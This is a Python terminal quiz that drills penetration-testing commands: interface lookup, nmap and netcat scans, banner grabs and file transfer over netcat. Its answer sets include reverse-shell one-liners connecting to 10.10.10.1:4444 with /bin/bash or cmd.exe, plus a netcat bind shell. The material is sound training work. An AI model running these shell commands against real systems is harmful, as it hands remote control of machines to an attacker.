# Penetration Testing Mini-Game (15 questions)
# Importing colorama library
# Color setup
try:
    from colorama import Fore, Style, init, Back
    init(autoreset=True)
except Exception:
    class _Ansi:
        BLACK = "\033[30m"; RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m";
        BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; WHITE = "\033[37m";
    class _Style:
        RESET_ALL = "\033[0m"; BRIGHT = "\033[1m"
    Fore = _Ansi()
    Style = _Style()
    def init(*args, **kwargs):
        return None

import os
import time


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def title():
    print(Fore.CYAN + "=" * 74 + Style.RESET_ALL)
    print(Fore.GREEN + Style.BRIGHT + "   TRY HARDER (Mini) — Penetration Testing Practice (15 Qs)" + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 74 + Style.RESET_ALL)
    print("Type the exact command/payload when asked. Hints provided.")
    print()


def ask(prompt: str) -> str:
    return input(Fore.MAGENTA + prompt + Style.RESET_ALL).strip()


def normalize(s: str) -> str:
    return " ".join(s.lower().split())


CAT_OK = """
 /\_/\ 
( ^_^)b  Correct!
 >   <
"""

CAT_BAD = """
 /\_/\
( T_T )  Try again
 > ^ <
"""

def ask_until_correct(prompt: str, accepted: set[str]) -> None:
    while True:
        ans = ask(prompt)
        if normalize(ans) in accepted:
            print(Fore.GREEN + CAT_OK + Style.RESET_ALL)
            return
        else:
            print(Fore.RED + CAT_BAD + Style.RESET_ALL)

def ask_sequence(steps: list[tuple[str, set[str]]]) -> None:
    for prompt, accepted in steps:
        ask_until_correct(prompt, accepted)

def run_game():
    clear()
    title()
    points = 0

    # NEW: Question 1
    q1_title = "Host 1: Find IP address"
    print(Fore.GREEN + q1_title + Style.RESET_ALL)
    print("Hint: Show network interfaces (classic or modern).")
    ask_until_correct("kali@Kat:~$ ", {"ifconfig", "ip a", "ip addr"})
    points += 1
    print()

    # NEW: Question 2
    print(Fore.GREEN + "Host 2: Port scan a target (TCP SYN)" + Style.RESET_ALL)
    print("Hint: Quick scan 192.168.1.1 ports with a popular tool.")
    ask_until_correct("kali@Kat:~$ ", {"nmap -sS 192.168.1.1", "nmap -ss 192.168.1.1"})
    points += 1
    print()

    # NEW: Question 3
    print(Fore.GREEN + "Host 3: Grab a service banner with netcat" + Style.RESET_ALL)
    print("Hint: Connect to example.com on port 80 using nc (show connection info).")
    ask_until_correct("kali@Kat:~$ ", {normalize("nc -nv example.com 80"), normalize("nc example.com 80")})
    points += 1
    print()

    # NEW: Question 4
    print(Fore.GREEN + "Host 4: Start a netcat listener" + Style.RESET_ALL)
    print("Hint: Listen on TCP port 4444 and show verbose output.")
    ask_until_correct("kali@Kat:~$ ", {normalize("nc -lvnp 4444"), normalize("nc -nlvp 4444"), normalize("nc -lvp 4444"), normalize("nc -l -p 4444")})
    points += 1
    print()

    

    # NEW: Question 5
    print(Fore.GREEN + "Host 5: Reverse shell (attacker has listener)" + Style.RESET_ALL)
    print("Hint: From victim, use nc to connect back to 10.10.10.1:4444 and spawn a shell.")
    ask_until_correct("victim$ ", {normalize("nc 10.10.10.1 4444 -e /bin/bash"), normalize("nc 10.10.10.1 4444 -e /bin/sh")})
    points += 1
    print()

    # NEW: Question 6
    print(Fore.GREEN + "Host 6: Bind shell (victim listens)" + Style.RESET_ALL)
    print("Hint: On victim, listen on 4444 and execute a shell on connect.")
    ask_until_correct("victim$ ", {normalize("nc -lvnp 4444 -e /bin/bash"), normalize("nc -lvnp 4444 -e /bin/sh"), normalize("nc -l -p 4444 -e /bin/sh")})
    points += 1
    print()

    # NEW: Question 7
    print(Fore.GREEN + "Host 7: Connect to a bind shell" + Style.RESET_ALL)
    print("Hint: Target 192.168.1.20 is listening on 4444.")
    ask_until_correct("kali@Kat:~$ ", {normalize("nc 192.168.1.20 4444"), normalize("nc -nv 192.168.1.20 4444")})
    points += 1
    print()

    # NEW: Question 8
    print(Fore.GREEN + "Host 8: TCP port scan with nc" + Style.RESET_ALL)
    print("Hint: Scan 192.168.1.5 ports 1-1024 verbosely.")
    ask_until_correct("kali@Kat:~$ ", {normalize("nc -zv 192.168.1.5 1-1024"), normalize("nc -vz 192.168.1.5 1-1024")})
    points += 1
    print()

    # NEW: Question 9
    print(Fore.GREEN + "Host 9: UDP check with nc" + Style.RESET_ALL)
    print("Hint: Probe UDP 53 on 192.168.1.9 with zero-I/O mode.")
    ask_until_correct("kali@Kat:~$ ", {normalize("nc -zvu 192.168.1.9 53"), normalize("nc -z -v -u 192.168.1.9 53")})
    points += 1
    print()

    # NEW: Question 10
    print(Fore.GREEN + "Host 10: Receive a file over TCP (listener)" + Style.RESET_ALL)
    print("Hint: Listen on 9001 and save to out.bin")
    ask_until_correct("kali@Kat:~$ ", {normalize("nc -lvnp 9001 > out.bin"), normalize("nc -l -p 9001 > out.bin")})
    points += 1
    print()

    # NEW: Question 11
    print(Fore.GREEN + "Host 11: Send a file with nc (sender)" + Style.RESET_ALL)
    print("Hint: Send file.bin to 192.168.1.10 port 9001")
    ask_until_correct("kali@Kat:~$ ", {normalize("cat file.bin | nc 192.168.1.10 9001"), normalize("nc 192.168.1.10 9001 < file.bin")})
    points += 1
    print()

    # NEW: Question 12
    print(Fore.GREEN + "Host 12: HTTP banner grab with request" + Style.RESET_ALL)
    print("Hint: Use printf to send a HEAD request via nc to example.com:80")
    ask_until_correct("kali@Kat:~$ ", {normalize("printf 'HEAD / HTTP/1.0\r\n\r\n' | nc -nv example.com 80"), normalize("echo -e 'HEAD / HTTP/1.0\r\n\r\n' | nc -nv example.com 80")})
    points += 1
    print()

    # NEW: Question 13
    print(Fore.GREEN + "Host 13: Windows nc listener" + Style.RESET_ALL)
    print("Hint: On Windows, listen on 4444 with nc.exe and be verbose")
    ask_until_correct("C:\\> ", {normalize("nc.exe -lvnp 4444"), normalize("nc.exe -lnvp 4444")})
    points += 1
    print()

    # NEW: Question 14
    print(Fore.GREEN + "Host 14: Windows reverse shell with ncat" + Style.RESET_ALL)
    print("Hint: Connect back to 10.10.10.1:4444 and execute cmd.exe")
    ask_until_correct("C:\\> ", {normalize("ncat.exe 10.10.10.1 4444 -e cmd.exe"), normalize("nc.exe 10.10.10.1 4444 -e cmd.exe")})
    points += 1
    print()

    # NEW: Question 15
    print(Fore.GREEN + "Host 15: Quick single-port check with nc" + Style.RESET_ALL)
    print("Hint: Verify if 192.168.1.1 has SSH open on 22 using zero-I/O and verbose")
    ask_until_correct("kali@Kat:~$ ", {normalize("nc -zv 192.168.1.1 22"), normalize("nc -vz 192.168.1.1 22")})
    points += 1
    print()

    # Results
    print(Fore.CYAN + "=" * 74 + Style.RESET_ALL)
    print(Fore.YELLOW + Style.BRIGHT + f"Score: {points}/15" + Style.RESET_ALL)
    if points == 15:
        print(Fore.GREEN + "Perfect! Meow!" + Style.RESET_ALL)
        print(Fore.GREEN + " /\\_/\\\n( o.o )  Great job!\n > ^ <" + Style.RESET_ALL)
    elif points >= 10:
        print(Fore.GREEN + "Solid! Keep going." + Style.RESET_ALL)
    elif points >= 6:
        print(Fore.YELLOW + "Not bad—practice more." + Style.RESET_ALL)
    else:
        print(Fore.RED + "Try harder!" + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 74 + Style.RESET_ALL)


if __name__ == "__main__":
    run_game()
